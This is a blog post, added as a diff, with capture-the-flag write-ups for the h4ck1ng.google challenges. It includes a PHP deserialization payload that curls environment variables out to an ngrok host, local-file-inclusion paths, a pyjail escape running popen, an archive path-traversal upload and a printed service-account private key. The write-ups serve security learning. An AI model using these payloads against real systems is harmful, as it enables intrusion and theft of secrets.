@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title></title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://www.atteniemi.com/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://www.atteniemi.com/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;www.atteniemi.com">
+                                <span itemprop="name">home</span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;www.atteniemi.com&#x2F;about">
+                                <span itemprop="name">about</span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;github.com&#x2F;hur">
+                                <span itemprop="name">github</span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">Writeups for h4ck1ng.google challenges</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>17 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2022-10-17
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <p>This post contains short writeups for all main challenges of h4ck1ng.google. </p>
+<span id="continue-reading"></span>
+<p>I'm keeping these quite brief due to being busy with coursework.</p>
+<h2 id="ep000ch01">EP000CH01</h2>
+<p>The following javascript in the web page reveals a <code>load_board.php</code> route that is vulnerable to LFI. </p>
+<pre data-lang="html" style="background-color:#181818;color:#c4c4c4;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#ca7473;">script</span><span>&gt;
+</span><span>function </span><span style="color:#ca7473;">load_baseboard</span><span>() {
+</span><span>  const </span><span style="color:#b678a9;">url </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&quot;load_board.php&quot;
+</span><span>  let </span><span style="color:#b678a9;">xhr </span><span style="color:#ca7473;">= new </span><span style="color:#c1bb71;">XMLHttpRequest</span><span>()
+</span><span>  const </span><span style="color:#b678a9;">formData </span><span style="color:#ca7473;">= new </span><span style="color:#b678a9;">FormData</span><span>();
+</span><span>  </span><span style="color:#b678a9;">formData</span><span>.</span><span style="color:#b678a9;">append</span><span>(</span><span style="color:#c59c70;">&#39;filename&#39;</span><span>, </span><span style="color:#c59c70;">&#39;baseboard.fen&#39;</span><span>)
+</span><span>
+</span><span>  </span><span style="color:#b678a9;">xhr</span><span>.</span><span style="color:#b678a9;">open</span><span>(</span><span style="color:#c59c70;">&#39;POST&#39;</span><span>, </span><span style="color:#b678a9;">url</span><span>, </span><span style="color:#64be81;">true</span><span>)
+</span><span>  </span><span style="color:#b678a9;">xhr</span><span>.</span><span style="color:#b678a9;">send</span><span>(</span><span style="color:#b678a9;">formData</span><span>);
+</span><span>  </span><span style="color:#c1bb71;">window</span><span>.location.href </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&quot;index.php&quot;</span><span>;
+</span><span>}
+</span><span>&lt;/</span><span style="color:#ca7473;">script</span><span>&gt;
+</span></code></pre>
+<p>We can leak <code>/proc/self/environ</code> to obtain the flag, which is stored as an environment variable.</p>
+<h2 id="ep000ch02">EP000CH02</h2>
+<p>In the search query, the <code>file</code> is vulnerable to LFI, but will only show matches from the file for search terms with at least 4 characters. You can leak bits of the source code (after obtaining path to source code from <code>/proc/self/environ</code>). </p>
+<p>LFI of <code>../../../../../flag</code> gives the flag, since we know the solve URL's are of the form h4ck1ng.google/solve/..</p>
+<h2 id="ep001ch01">EP001CH01</h2>
+<p><code>grep</code> for &quot;wannacry&quot; in the binary that was provided, which leads to this URL: <a href="https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/">https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/</a>. This page contains a large number of keys, one of which likely is the encryption key.</p>
+<p>We can extract all the keys from the page:</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">import </span><span>requests
+</span><span style="color:#ca7473;">from </span><span>bs4 </span><span style="color:#ca7473;">import </span><span>BeautifulSoup
+</span><span style="color:#ca7473;">from </span><span>tqdm </span><span style="color:#ca7473;">import </span><span>tqdm
+</span><span>url </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/&#39;
+</span><span>
+</span><span>r </span><span style="color:#ca7473;">= </span><span>requests.</span><span style="color:#b678a9;">get</span><span>(url)
+</span><span>
+</span><span>soup </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">BeautifulSoup</span><span>(r.text)
+</span><span>
+</span><span style="color:#ca7473;">for </span><span>a </span><span style="color:#ca7473;">in </span><span style="color:#b678a9;">tqdm</span><span>(soup.</span><span style="color:#b678a9;">find_all</span><span>(</span><span style="color:#c59c70;">&#39;a&#39;</span><span>, </span><span style="color:#c59c70;">href</span><span style="color:#ca7473;">=</span><span style="color:#64be81;">True</span><span>)):
+</span><span>    r </span><span style="color:#ca7473;">= </span><span>requests.</span><span style="color:#b678a9;">get</span><span>(url </span><span style="color:#ca7473;">+ </span><span>a[</span><span style="color:#c59c70;">&#39;href&#39;</span><span>])
+</span><span>    </span><span style="color:#ca7473;">with </span><span style="color:#6facbe;">open</span><span>(a[</span><span style="color:#c59c70;">&#39;href&#39;</span><span>], </span><span style="color:#c59c70;">&#39;w&#39;</span><span>) </span><span style="color:#ca7473;">as </span><span>f:
+</span><span>        f.</span><span style="color:#b678a9;">write</span><span>(r.text)
+</span></code></pre>
+<p>Then, just try decrypting with all the keys :)</p>
+<pre data-lang="bash" style="background-color:#181818;color:#c4c4c4;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ca7473;">for</span><span> f </span><span style="color:#ca7473;">in *</span><span>.pem</span><span style="color:#ca7473;">; do
+</span><span>	</span><span style="color:#b678a9;">./wannacry</span><span style="color:#c59c70;"> -encrypted_file</span><span> flag</span><span style="color:#c59c70;"> -key_file </span><span>$</span><span style="color:#b678a9;">f
+</span><span style="color:#ca7473;">done
+</span></code></pre>
+<h2 id="ep001ch02">EP001CH02</h2>
+<p>The binary contains a wordlist and a way to map current time to a word. This word is appended to <a href="https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/">https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/</a>, and is only valid for a short period of time. Visiting the valid URL gives you the flag. However, the program won't normally run properly (or call that function).</p>
+<p>Using GDB, we can do</p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>gdb break main
+</span><span>r
+</span><span>jump print
+</span><span>c
+</span></code></pre>
+<p>and quickly visit the URL to get the flag.</p>
+<h2 id="ep001ch03">EP001CH03</h2>
+<p>Same webpage as the first challenge of episode 000. However, the endpoint we exploited last time now makes sure that the file ends with <code>.fen</code>. </p>
+<p>There's another attack vector, though. Making moves on the chess board results in get requests with a <code>move_end</code> parameter that consists of base64 encoded PHP array. i.e. 
+<code>?move_end=YToyOntpOjA7czoyOiJlMiI7aToxO3M6MjoiZTQiO30=</code> which decodes to <code>a:2:{i:0;s:2:&quot;e2&quot;;i:1;s:2:&quot;e4&quot;;}</code>, a PHP array representing the move. This is passed to <code>deserialize()</code>, so we can exploit this.There's even a convenient object in the source code, <code>Stockfish</code>, with these interesting functions:</p>
+<pre data-lang="php" style="background-color:#181818;color:#c4c4c4;" class="language-php "><code class="language-php" data-lang="php"><span>public function __wakeup()
+</span><span>    {
+</span><span>        $this-&gt;process = proc_open($this-&gt;binary, $this-&gt;descriptorspec, $this-&gt;pipes, $this-&gt;cwd, null, $this-&gt;other_options) ;
+</span><span>        echo &#39;</span><span style="color:#6a6a6a;">&lt;!--&#39;.&#39;wakeupcalled&#39;.fgets($this-&gt;pipes[1], 4096).&#39;--&gt;</span><span>&#39;;
+</span><span>    }
+</span><span>
+</span><span> public function __toString()
+</span><span>    {
+</span><span>        return fgets($this-&gt;pipes[1], 4096);
+</span><span>    }
+</span></code></pre>
+<p><code>__wakeup()</code> gets called when deserializing the object, and conveniently there is a debug print of the object right after which will result in <code>__toString()</code> being called. We then construct a deserialization payload like such:</p>
+<pre data-lang="php" style="background-color:#181818;color:#c4c4c4;" class="language-php "><code class="language-php" data-lang="php"><span>O:9:&quot;Stockfish&quot;:4:{s:3:&quot;cwd&quot;;s:2:&quot;./&quot;;s:6:&quot;binary&quot;;s:69:&quot;curl https://34c4-85-255-233-71.eu.ngrok.io/$(printenv | grep google)&quot;;s:13:&quot;other_options&quot;;a:1:{s:12:&quot;bypass_shell&quot;;s:4:&quot;true&quot;;}s:14:&quot;descriptorspec&quot;;a:2:{i:0;a:2:{i:0;s:4:&quot;pipe&quot;;i:1;s:1:&quot;r&quot;;}i:1;a:2:{i:0;s:4:&quot;pipe&quot;;i:1;s:1:&quot;w&quot;;}}}
+</span></code></pre>
+<p>to get the environment value containing the flag.</p>
+<h2 id="ep002ch01">EP002CH01</h2>
+<p>Extract RGBA values of the image using <a href="https://stegonline.georgeom.net/image">StegOnline</a>
+Decode them as bytes representing a character each.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#6a6a6a;"># a = [1, 0, ...], the list of extracted values.
+</span><span>s </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;&#39;
+</span><span style="color:#ca7473;">for </span><span>i,v </span><span style="color:#ca7473;">in </span><span style="color:#6facbe;">enumerate</span><span>(a):
+</span><span>    </span><span style="color:#ca7473;">if </span><span>i </span><span style="color:#ca7473;">% </span><span style="color:#6facbe;">8 </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">0 </span><span style="color:#ca7473;">and </span><span>i </span><span style="color:#ca7473;">!= </span><span style="color:#6facbe;">0</span><span>:
+</span><span>        </span><span style="color:#ca7473;">if </span><span style="color:#6facbe;">len</span><span>(s) </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">8</span><span>:
+</span><span>            </span><span style="color:#6facbe;">print</span><span>(</span><span style="color:#6facbe;">chr</span><span>(</span><span style="color:#c1bb71;">int</span><span>(s, </span><span style="color:#6facbe;">2</span><span>)),</span><span style="color:#c59c70;">end</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">&#39;&#39;</span><span>)
+</span><span>        s </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;&#39;
+</span><span>    </span><span style="color:#ca7473;">if </span><span>v </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">1 </span><span style="color:#ca7473;">or </span><span>v </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">0</span><span>:
+</span><span>        s </span><span style="color:#ca7473;">+= </span><span style="color:#c1bb71;">str</span><span>(v)
+</span></code></pre>
+<p>This decodes to a certificate, (might be slightly corrupted because of bad parsing, but works)</p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>-----BEGIN CERTIFICATE-----
+</span><span>MIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx
+</span><span>CzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v
+</span><span>aDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD
+</span><span>VQQDDApnb29nbGUuY29tMB4XDTIyMDkzMDE4NTEwNVoXDTMyMDkyNzE4NTEwNVow
+</span><span>cDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDE7MDkGA1UECgwyaHR0cHM6
+</span><span>Ly9oNGNrMW5nLmdvb2dsZS9zb2x2ZS81M2N1cjFUeV9CeV8wYjVDdXIxdFkxEzAR
+</span><span>BgNVBAMMCmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+</span><span>AQDCX25BoQBBndrOiS6L11/RwWf6FNS+fUct7CLq9yMxU+xJ+yPVFZa7+trkvwe0
+</span><span>IXWduNIb/USvtOb8I8X8H/MHVMCypBQisFMxHnZmv2D/QVRySIJpMdah8va+LL5o
+</span><span>7Dv0LD73ynGUw8rW8VQUrlGF5cJRSgd3ZVbDUjR33GD4TjdIChzs/WMZGSP7c/lk
+</span><span>sSLMd2eCYbdwo5pz7KaYa7ta0b3gf055q4E/uJ00TUN26GkYOi/c7PZrgQu+hXR6
+</span><span>onn2HhkBNrloUlZaI5kJ2v3QRHt2UxnAhS7YVpQ6ZS4h8LQf6mvnZ/Zx71SyZmkk
+</span><span>AuvhSjU8bCeIypSC82RbEi6fAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBABj1PIHB
+</span><span>cKJgxEXo6AT+8OMYWFd2M2HsioevNvmpsAQjjlPRfY3E9DF7H49XagnON3YM
+</span><span>dDvN4IwmHSRKIemdEyc/D2+Dr/Ky5FSU6NymUiUGUGV+aDGXIFV/NOaq0b9ASbBh
+</span><span>78TLN2+/Val933tHWQpPqmpw30v4XknYPF5R+ghqr9r9A0dVPstDmq1HBOuazWJe
+</span><span>DBUBHenbSW6EPnFYZc8zuCSLZtIJvlAryJrmcFWTridUmtXjM5Lyh05LFAFVH6wl
+</span><span>z0sVEvisfE9aw4zfotBsV6zvgOL1ypYsX20KJ6zIJycRBkWgmOzQxKCZ5fxfKCFT
+</span><span>8mr99Mujp9EBzPA=
+</span><span>-----END CERTIFICATE-----
+</span></code></pre>
+<p>and base64 decoding with <code>cat cert.pem | base64 -d</code> gives the flag.</p>
+<h2 id="ep002ch02">EP002CH02</h2>
+<p>Just looking through the log file, the flag can be quickly found.</p>
+<h2 id="ep002ch03">EP002CH03</h2>
+<p>We have a shell with most commands being disabled. We do have tab completions, though. This allows us to locate the flag with completion on something like <code>../../../</code>. Furthermore, there is a tool <code>_dnr_toolkit</code>, and completions are known for its subcommands. With a little bit of testing, we notice an interesting feature:</p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>_dnr_toolkit sendkeepalive 
+</span><span>reading serverlist from /default_serverlist
+</span><span>invalid server spec: testspec
+</span></code></pre>
+<p>Then, using tab completion on <code>_dnr_toolkit sendkeepalive --serverlist /flag</code> gives us the flag.</p>
+<h2 id="ep003ch01">EP003CH01</h2>
+<p>Through the intro challenge we have the password to obtain a shell on a computer. Digging around we find a file called <code>backup.py</code>. It uses an API token to fetch a file from <code>https://docs.googleapis.com/v1/documents/1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM</code>. They have deleted the file containing the token, though. Or have they? 
+We can find the private key that is used to create authorization tokens in <code>.config/gcloud/</code></p>
+<pre data-lang="json" style="background-color:#181818;color:#c4c4c4;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>  </span><span style="color:#c59c70;">&quot;client_email&quot;</span><span>: </span><span style="color:#c59c70;">&quot;backup-tool@project-multivision.iam.gserviceaccount.com&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;client_id&quot;</span><span>: </span><span style="color:#c59c70;">&quot;105494657484877589161&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;private_key&quot;</span><span>: </span><span style="color:#c59c70;">&quot;-----BEGIN PRIVATE KEY-----</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH/WQiLjqB2nn</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">cMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d/knWw/f+0M</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">PY3tli2oQIHuqLH5GIkVhm/xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">IuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh/5sNFa+UzUE1QqpWymdRVhDHekxz0erWM</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">c67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">m+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy/We4OWeUWDYiFBxZu</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">Ze+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9/gYHteOkhMqO9+5bboo/bGeg</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">aqAJZiohNMSdrKUHs/b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">vn7ngWnWWn8SSbpfxPCUWf6jAP/kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">e+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">n/GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd/g8FStPdJ+BanqcsZIUQf07zUxk5Xb</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">DdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r/QjF0OPLRLyvRXR8R5g25LYXL8Yk</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">nLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">uj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9/54y8</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">iqmBvoMBSLgWElp1vXvW7ICED/d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">aS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">WnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">kiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">z6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH/qgSfzD</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">tephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod/wKBgAgHdxxm1anORWoZVMhZ</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">DgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk/w2mWsZU</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">lbfS/vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">rwrzx7aO6kKU+DHb9EoEN+LI</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">-----END PRIVATE KEY-----</span><span style="color:#64be81;">\n</span><span style="color:#c59c70;">&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;private_key_id&quot;</span><span>: </span><span style="color:#c59c70;">&quot;722d66d6da8d6d5356d73d04d9366a76c7ada494&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;project_id&quot;</span><span>: </span><span style="color:#c59c70;">&quot;project-multivision&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;token_uri&quot;</span><span>: </span><span style="color:#c59c70;">&quot;https://oauth2.googleapis.com/token&quot;</span><span>,
+</span><span>  </span><span style="color:#c59c70;">&quot;type&quot;</span><span>: </span><span style="color:#c59c70;">&quot;service_account&quot;
+</span><span>}
+</span></code></pre>
+<p>We can use the above json file to obtain a token that allows us to fetch the file. </p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b678a9;">SCOPES </span><span style="color:#ca7473;">= </span><span>[
+</span><span>    </span><span style="color:#c59c70;">&#39;https://www.googleapis.com/auth/cloud-platform&#39;</span><span>, 
+</span><span>    </span><span style="color:#c59c70;">&#39;https://www.googleapis.com/auth/documents.readonly&#39;
+</span><span>]
+</span><span style="color:#b678a9;">SERVICE_ACCOUNT_FILE </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;adc.json&#39;
+</span><span>
+</span><span style="color:#ca7473;">import </span><span>google.auth
+</span><span style="color:#ca7473;">import </span><span>google.auth.transport.requests
+</span><span style="color:#ca7473;">from </span><span>google.oauth2 </span><span style="color:#ca7473;">import </span><span>service_account
+</span><span>
+</span><span>cred </span><span style="color:#ca7473;">= </span><span>service_account.Credentials.</span><span style="color:#b678a9;">from_service_account_file</span><span>(
+</span><span>            </span><span style="color:#b678a9;">SERVICE_ACCOUNT_FILE</span><span>, </span><span style="color:#c59c70;">scopes</span><span style="color:#ca7473;">=</span><span style="color:#b678a9;">SCOPES</span><span>)
+</span><span>auth_req </span><span style="color:#ca7473;">= </span><span>google.auth.transport.requests.</span><span style="color:#b678a9;">Request</span><span>()
+</span><span>cred.</span><span style="color:#b678a9;">refresh</span><span>(auth_req)
+</span><span style="color:#6facbe;">print</span><span>(cred)
+</span><span style="color:#6facbe;">print</span><span>(cred.token)
+</span></code></pre>
+<p>We can then fill the missing <code>get_token()</code> function in <code>backup.py</code> to fetch the file, which contains the flag.</p>
+<h2 id="ep003ch02">EP003CH02</h2>
+<p>We have a fun game in the terminal. It's quite hard to beat though. The goal of the game is to obtain a password. However, the Konami code works as a password, so we can skip the game. 
+We end up in a pyjail that has a line length limit, too.</p>
+<p>First, we locate <code>os._wrap_close</code> by just playing with commands like this:</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#6facbe;">print</span><span>(</span><span style="color:#c59c70;">&quot;&quot;</span><span>.__class__.__mro__[</span><span style="color:#6facbe;">1</span><span>].</span><span style="color:#6facbe;">__subclasses__</span><span>()[</span><span style="color:#6facbe;">125</span><span>:])
+</span></code></pre>
+<p>Then, we must get creative to bypass the line length limit. 
+There is a <code>config</code> object with a <code>__setattr__</code> method. This allows us to store things.
+Thus, we do</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#6facbe;">print</span><span>(config.</span><span style="color:#6facbe;">__setattr__</span><span>(</span><span style="color:#c59c70;">&#39;a&#39;</span><span>,</span><span style="color:#c59c70;">&quot;&quot;</span><span>.__class__.__mro__[</span><span style="color:#6facbe;">1</span><span>].</span><span style="color:#6facbe;">__subclasses__</span><span>))
+</span><span style="color:#6facbe;">print</span><span>(config.</span><span style="color:#6facbe;">__setattr__</span><span>(</span><span style="color:#c59c70;">&#39;b&#39;</span><span>, config.</span><span style="color:#b678a9;">a</span><span>()[</span><span style="color:#6facbe;">132</span><span>].</span><span style="color:#6facbe;">__init__</span><span>.__globals__))
+</span><span style="color:#6facbe;">print</span><span>(config.b[</span><span style="color:#c59c70;">&#39;popen&#39;</span><span>](</span><span style="color:#c59c70;">&#39;cat flag&#39;</span><span>).</span><span style="color:#b678a9;">read</span><span>())
+</span></code></pre>
+<p>to get the flag.</p>
+<h2 id="ep003ch03">EP003CH03</h2>
+<p>Android application that can be used to scan a QR code. However, it won't give us the flag unless we are subscribed.</p>
+<p>With <code>apktool d</code> we can decompile the challenge.
+Then, we just patch the <code>.smali</code> file containing the <code>isSubscribed()</code> method to return True.</p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>.method public static final isSubscribed()Z
+</span><span>    .locals 1
+</span><span>
+</span><span>    .line 24
+</span><span>    const v0, true
+</span><span>    return v0
+</span><span>.end method
+</span></code></pre>
+<p>We use <code>apktool b</code> to build this, and then sign it with 
+<code>uber-apk-signer</code>. Scan the QR code, get the flag.</p>
+<h2 id="ep004ch01">EP004CH01</h2>
+<p>Skip this one until you have obtained source code for the challenge through EP004CH03.
+Then, we can figure out what to send to the import endpoint. </p>
+<p>Using <a href="https://github.com/ptoomey3/evilarc">ptoomey3/evilarc</a>, we construct an archive that cotains a file with directory traversal characters in its path. i.e. a file like <code>../../../../../../../flag</code>.</p>
+<p>The import endpoint notices that the file exists and gives us a diff, containing the flag.
+The correct URL parameters were obtained through source code for <code>app.go</code>.</p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>curl -v -F &#39;attachments=@evil.tar.gz&#39; &#39;https://path-less-traversed-web.h4ck.ctfcom
+</span><span>petition.com/import?debug=true&amp;submission=sample_submission&amp;dryRun=false&#39;
+</span></code></pre>
+<h2 id="ep004ch02">EP004CH02</h2>
+<p>The vulnerability is in the following function in the application</p>
+<pre data-lang="js" style="background-color:#181818;color:#c4c4c4;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#6a6a6a;">/**
+</span><span style="color:#6a6a6a;"> * Checks if the given strings are identical. Runs in constant time and it
+</span><span style="color:#6a6a6a;"> * should be invulnerable from timing attacks.
+</span><span style="color:#6a6a6a;"> * 
+</span><span style="color:#6a6a6a;"> * Reference: https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html
+</span><span style="color:#6a6a6a;"> * 
+</span><span style="color:#6a6a6a;"> * @param {string} </span><span style="color:#b678a9;">a
+</span><span style="color:#6a6a6a;"> * @param {string} </span><span style="color:#b678a9;">b
+</span><span style="color:#6a6a6a;"> * @returns a boolean indicating if the strings are equal.
+</span><span style="color:#6a6a6a;"> */
+</span><span>function </span><span style="color:#ca7473;">safeEqual</span><span>(</span><span style="color:#c59c70;">a</span><span>, </span><span style="color:#c59c70;">b</span><span>) {
+</span><span>    let </span><span style="color:#b678a9;">match </span><span style="color:#ca7473;">= </span><span style="color:#64be81;">true</span><span>;
+</span><span>
+</span><span>    </span><span style="color:#ca7473;">if </span><span>(</span><span style="color:#b678a9;">a</span><span>.length </span><span style="color:#ca7473;">!== </span><span style="color:#b678a9;">b</span><span>.length) {
+</span><span>        </span><span style="color:#b678a9;">match </span><span style="color:#ca7473;">= </span><span style="color:#64be81;">false</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    const </span><span style="color:#b678a9;">l </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">a</span><span>.length;
+</span><span>    </span><span style="color:#ca7473;">for </span><span>(let </span><span style="color:#b678a9;">i </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">0</span><span>; </span><span style="color:#b678a9;">i </span><span style="color:#ca7473;">&lt; </span><span style="color:#b678a9;">l</span><span>; </span><span style="color:#b678a9;">i</span><span style="color:#ca7473;">++</span><span>) {
+</span><span>        </span><span style="color:#b678a9;">match </span><span style="color:#ca7473;">&amp;&amp;= </span><span style="color:#b678a9;">a</span><span>.</span><span style="color:#6facbe;">indexOf</span><span>(</span><span style="color:#b678a9;">i</span><span>) </span><span style="color:#ca7473;">=== </span><span style="color:#b678a9;">b</span><span>.</span><span style="color:#6facbe;">indexOf</span><span>(</span><span style="color:#b678a9;">i</span><span>);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#ca7473;">return </span><span style="color:#b678a9;">match</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#c1bb71;">module</span><span>.</span><span style="color:#c1bb71;">exports </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">safeEqual
+</span></code></pre>
+<p>This function is used in the login flow of the application, in </p>
+<pre data-lang="js" style="background-color:#181818;color:#c4c4c4;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#6a6a6a;">/**
+</span><span style="color:#6a6a6a;"> * Finds a user by username and password.
+</span><span style="color:#6a6a6a;"> * @param {string} </span><span style="color:#b678a9;">username
